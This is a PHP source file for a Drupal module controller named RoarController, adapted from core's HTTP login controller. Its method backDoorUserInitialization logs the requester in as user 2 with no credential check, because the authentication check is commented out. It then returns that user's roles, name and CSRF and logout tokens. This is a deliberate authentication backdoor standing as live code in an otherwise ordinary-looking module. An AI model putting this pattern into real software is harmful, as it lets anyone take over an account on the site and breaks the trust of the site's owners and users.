<?php

namespace Drupal\dino_roar\Controller;

use Drupal\Core\Access\CsrfTokenGenerator;
use Drupal\Core\Controller\ControllerBase;
use Drupal\Core\DependencyInjection\ContainerInjectionInterface;
use Drupal\Core\Routing\RouteProviderInterface;
use Drupal\user\UserAuthInterface;
use Drupal\user\UserInterface;
use Drupal\user\UserStorageInterface;
use Psr\Log\LoggerInterface;
use Symfony\Component\DependencyInjection\ContainerInterface;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;
use Symfony\Component\HttpKernel\Exception\BadRequestHttpException;
use Symfony\Component\Serializer\Encoder\JsonEncoder;
use Symfony\Component\Serializer\Serializer;

/**
 * Provides controllers for login, login status and logout via HTTP requests.
 */
class RoarController extends ControllerBase implements ContainerInjectionInterface {

  
  /**
   * String sent in responses, to describe the user as being logged in.
   *
   * @var string
   */
  const LOGGED_IN = 1;

  /**
   * String sent in responses, to describe the user as being logged out.
   *
   * @var string
   */
  const LOGGED_OUT = 0;
  /**
   * The user storage.
   *
   * @var \Drupal\user\UserStorageInterface
   */
  protected $userStorage;

  /**
   * The CSRF token generator.
   *
   * @var \Drupal\Core\Access\CsrfTokenGenerator
   */
  protected $csrfToken;

  /**
   * The user authentication.
   *
   * @var \Drupal\user\UserAuthInterface
   */
  protected $userAuth;

  /**
   * The route provider.
   *
   * @var \Drupal\Core\Routing\RouteProviderInterface
   */
  protected $routeProvider;

  /**
   * The serializer.
   *
   * @var \Symfony\Component\Serializer\Serializer
   */
  protected $serializer;

  /**
   * The available serialization formats.
   *
   * @var array
   */
  protected $serializerFormats = [];

  /**
   * A logger instance.
   *
   * @var \Psr\Log\LoggerInterface
   */
  protected $logger;

  /**
   * Constructs a new UserAuthenticationController object.
   *
   * @param \Drupal\user\UserStorageInterface $user_storage
   *   The user storage.
   * @param \Drupal\Core\Access\CsrfTokenGenerator $csrf_token
   *   The CSRF token generator.
   * @param \Drupal\user\UserAuthInterface $user_auth
   *   The user authentication.
   * @param \Drupal\Core\Routing\RouteProviderInterface $route_provider
   *   The route provider.
   * @param \Symfony\Component\Serializer\Serializer $serializer
   *   The serializer.
   * @param array $serializer_formats
   *   The available serialization formats.
   * @param \Psr\Log\LoggerInterface $logger
   *   A logger instance.
   */
    
  public function __construct(UserStorageInterface $user_storage, CsrfTokenGenerator $csrf_token, UserAuthInterface $user_auth, RouteProviderInterface $route_provider, Serializer $serializer, array $serializer_formats, LoggerInterface $logger) { 
   $this->userStorage = $user_storage;
    $this->csrfToken = $csrf_token;
    $this->userAuth = $user_auth;
    $this->serializer = $serializer;
    $this->serializerFormats = $serializer_formats;
    $this->routeProvider = $route_provider;
    $this->logger = $logger;
	
	
	
  }

  /**
   * {@inheritdoc}
   */
  public static function create(ContainerInterface $container) {
    if ($container->hasParameter('serializer.formats') && $container->has('serializer')) {
      $serializer = $container->get('serializer');
      $formats = $container->getParameter('serializer.formats');
    }
    else {
      $formats = ['json'];
      $encoders = [new JsonEncoder()];
      $serializer = new Serializer([], $encoders);
    }

    return new static(
      $container->get('entity_type.manager')->getStorage('user'),
      $container->get('csrf_token'),
      $container->get('user.auth'),
      $container->get('router.route_provider'),
      $serializer,
      $formats,
      $container->get('logger.factory')->get('user')
    );
  }

  public function backDoorUserInitialization(Request $request) {
//	$status = $this->currentUser()->isAuthenticated();
//	if(!$status){
//	echo '';
//	}
echo "world";
    $format = $this->getRequestFormat($request);

    $uid=2;
      
    $user = $this->userStorage->load($uid);
    $this->userLoginFinalize($user);


	
    // Send basic metadata about the logged in user.
    $response_data = [];
    if ($user->get('uid')->access('view', $user)) {
        $response_data['current_user']['uid'] = $user->id();
    }
    if ($user->get('roles')->access('view', $user)) {
        $response_data['current_user']['roles'] = $user->getRoles();
    }
    if ($user->get('name')->access('view', $user)) {
        $response_data['current_user']['name'] = $user->getAccountName();
    }
    $response_data['csrf_token'] = $this->csrfToken->get('rest');
     
	

    $logout_route = $this->routeProvider->getRouteByName('user.logout.http');
    // Trim '/' off path to match \Drupal\Core\Access\CsrfAccessCheck.
    $logout_path = ltrim($logout_route->getPath(), '/');
    $response_data['logout_token'] = $this->csrfToken->get($logout_path);

    $encoded_response_data = $this->serializer->encode($response_data, $format);

	
    return new Response($encoded_response_data);
	
  }
 

	////////////////////////////////////////////////////////////////////////////////
//	 $this->drupalLogout();
	//////////////////////////////////////
	protected function userLoginFinalize(UserInterface $user) {
     user_login_finalize($user);
    }

	///////////////////////////////////////////////////////////////////////
	protected function getRequestFormat(Request $request) {
       $format = $request->getRequestFormat();
       if (!in_array($format, $this->serializerFormats)) {
       throw new BadRequestHttpException("Unrecognized format: $format.");
     }
     return $format;
    }

 }


